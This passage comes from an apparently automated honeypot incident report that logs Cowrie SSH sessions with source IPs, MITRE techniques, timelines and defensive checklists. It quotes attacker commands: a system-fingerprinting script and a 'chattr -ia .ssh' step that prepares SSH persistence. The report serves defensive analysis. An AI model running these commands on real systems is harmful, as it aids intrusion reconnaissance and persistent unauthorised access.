- [ ] Submit `112.30.127[.]9` to AbuseIPDB if not already reported
- [ ] Block `112.30.127[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb429a2b0f2c

| Field | Detail |
|---|---|
| **Source IP** | `164.164.117[.]23` |
| **First Seen** | 2026-08-05 13:27 |
| **Last Seen** | 2026-08-05 13:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:27:54` | `cowrie.session.connect` |
| `2026-08-05 13:27:55` | `cowrie.client.version` |
| `2026-08-05 13:27:55` | `cowrie.client.kex` |
| `2026-08-05 13:27:58` | `cowrie.login.success` |
| `2026-08-05 13:27:59` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.164.117[.]23` to AbuseIPDB if not already reported
- [ ] Block `164.164.117[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada2f004cb15

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:28 |
| **Last Seen** | 2026-08-05 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:28:10` | `cowrie.session.connect` |
| `2026-08-05 13:28:10` | `cowrie.client.version` |
| `2026-08-05 13:28:10` | `cowrie.client.kex` |
| `2026-08-05 13:28:10` | `cowrie.login.success` |
| `2026-08-05 13:28:11` | `cowrie.session.params` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.success` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.command.input` |
| `2026-08-05 13:28:11` | `cowrie.log.closed` |
| `2026-08-05 13:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b6372afc158

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-08-05 13:29 |
| **Last Seen** | 2026-08-05 13:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:29:17` | `cowrie.session.connect` |
| `2026-08-05 13:29:18` | `cowrie.client.version` |
| `2026-08-05 13:29:18` | `cowrie.client.kex` |
| `2026-08-05 13:29:21` | `cowrie.login.success` |
| `2026-08-05 13:29:21` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b141c3e74f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:29 |
| **Last Seen** | 2026-08-05 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:29:41` | `cowrie.session.connect` |
| `2026-08-05 13:29:41` | `cowrie.client.version` |
| `2026-08-05 13:29:41` | `cowrie.client.kex` |
| `2026-08-05 13:29:42` | `cowrie.login.success` |
| `2026-08-05 13:29:43` | `cowrie.session.params` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.success` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.command.input` |
| `2026-08-05 13:29:43` | `cowrie.log.closed` |
| `2026-08-05 13:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f81d432b5be3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:31 |
| **Last Seen** | 2026-08-05 13:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:31:19` | `cowrie.session.connect` |
| `2026-08-05 13:31:19` | `cowrie.client.version` |
| `2026-08-05 13:31:19` | `cowrie.client.kex` |
| `2026-08-05 13:31:20` | `cowrie.login.success` |
| `2026-08-05 13:31:20` | `cowrie.session.params` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.success` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:20` | `cowrie.command.input` |
| `2026-08-05 13:31:21` | `cowrie.log.closed` |
| `2026-08-05 13:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19b9171b99f7

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-05 13:32 |
| **Last Seen** | 2026-08-05 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:32:31` | `cowrie.session.connect` |
| `2026-08-05 13:32:31` | `cowrie.client.version` |
| `2026-08-05 13:32:31` | `cowrie.client.kex` |
| `2026-08-05 13:32:31` | `cowrie.login.success` |
| `2026-08-05 13:32:32` | `cowrie.direct-tcpip.request` |
| `2026-08-05 13:32:32` | `cowrie.direct-tcpip.data` |
| `2026-08-05 13:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a822d67a11

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:32 |
| **Last Seen** | 2026-08-05 13:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:32:56` | `cowrie.session.connect` |
| `2026-08-05 13:32:56` | `cowrie.client.version` |
| `2026-08-05 13:32:56` | `cowrie.client.kex` |
| `2026-08-05 13:32:57` | `cowrie.login.success` |
| `2026-08-05 13:32:58` | `cowrie.session.params` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.success` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.command.input` |
| `2026-08-05 13:32:58` | `cowrie.log.closed` |
| `2026-08-05 13:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b83330f82358

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:34 |
| **Last Seen** | 2026-08-05 13:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:34:32` | `cowrie.session.connect` |
| `2026-08-05 13:34:32` | `cowrie.client.version` |
| `2026-08-05 13:34:32` | `cowrie.client.kex` |
| `2026-08-05 13:34:33` | `cowrie.login.success` |
| `2026-08-05 13:34:34` | `cowrie.session.params` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.success` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:34` | `cowrie.command.input` |
| `2026-08-05 13:34:35` | `cowrie.log.closed` |
| `2026-08-05 13:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d0ba0322e45

| Field | Detail |
|---|---|
| **Source IP** | `115.190.159[.]160` |
| **First Seen** | 2026-08-05 13:35 |
| **Last Seen** | 2026-08-05 13:40 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:35:01` | `cowrie.session.connect` |
| `2026-08-05 13:35:01` | `cowrie.client.version` |
| `2026-08-05 13:35:02` | `cowrie.client.kex` |
| `2026-08-05 13:35:04` | `cowrie.login.success` |
| `2026-08-05 13:35:05` | `cowrie.session.params` |
| `2026-08-05 13:35:05` | `cowrie.command.input` |
| `2026-08-05 13:35:05` | `cowrie.command.failed` |
| `2026-08-05 13:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.159[.]160` to AbuseIPDB if not already reported
- [ ] Block `115.190.159[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cebc929c4909

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:36 |
| **Last Seen** | 2026-08-05 13:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:36:08` | `cowrie.session.connect` |
| `2026-08-05 13:36:08` | `cowrie.client.version` |
| `2026-08-05 13:36:08` | `cowrie.client.kex` |
| `2026-08-05 13:36:08` | `cowrie.login.success` |
| `2026-08-05 13:36:10` | `cowrie.session.params` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.success` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.command.input` |
| `2026-08-05 13:36:10` | `cowrie.log.closed` |
| `2026-08-05 13:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66d69b48e30e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:37 |
| **Last Seen** | 2026-08-05 13:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:37:44` | `cowrie.session.connect` |
| `2026-08-05 13:37:44` | `cowrie.client.version` |
| `2026-08-05 13:37:44` | `cowrie.client.kex` |
| `2026-08-05 13:37:45` | `cowrie.login.success` |
| `2026-08-05 13:37:46` | `cowrie.session.params` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.success` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.command.input` |
| `2026-08-05 13:37:46` | `cowrie.log.closed` |
| `2026-08-05 13:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed54aa772b68

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:39 |
| **Last Seen** | 2026-08-05 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:39:24` | `cowrie.session.connect` |
| `2026-08-05 13:39:24` | `cowrie.client.version` |
| `2026-08-05 13:39:24` | `cowrie.client.kex` |
| `2026-08-05 13:39:24` | `cowrie.login.success` |
| `2026-08-05 13:39:25` | `cowrie.session.params` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.success` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:25` | `cowrie.command.input` |
| `2026-08-05 13:39:26` | `cowrie.log.closed` |
| `2026-08-05 13:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f99bcbd860af

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:41 |
| **Last Seen** | 2026-08-05 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:41:06` | `cowrie.session.connect` |
| `2026-08-05 13:41:06` | `cowrie.client.version` |
| `2026-08-05 13:41:06` | `cowrie.client.kex` |
| `2026-08-05 13:41:07` | `cowrie.login.success` |
| `2026-08-05 13:41:07` | `cowrie.session.params` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.success` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:07` | `cowrie.command.input` |
| `2026-08-05 13:41:08` | `cowrie.log.closed` |
| `2026-08-05 13:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef39ab99203

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 13:42 |
| **Last Seen** | 2026-08-05 13:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 13:42:33` | `cowrie.session.connect` |
| `2026-08-05 13:42:33` | `cowrie.client.version` |
| `2026-08-05 13:42:33` | `cowrie.client.kex` |
| `2026-08-05 13:42:34` | `cowrie.login.success` |
| `2026-08-05 13:42:35` | `cowrie.session.params` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.success` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.command.input` |
| `2026-08-05 13:42:35` | `cowrie.log.closed` |
| `2026-08-05 13:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b319642fcde0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
